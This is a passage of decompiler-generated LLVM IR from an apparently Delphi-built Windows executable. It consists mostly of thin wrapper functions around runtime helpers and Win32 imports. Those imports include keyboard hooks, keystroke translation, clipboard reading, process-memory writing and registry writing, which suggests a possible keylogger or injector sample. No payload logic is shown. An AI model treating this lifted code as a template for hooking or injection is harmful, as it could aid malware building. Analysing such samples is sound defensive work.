dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036c6, !insn.addr !85

dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374() local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
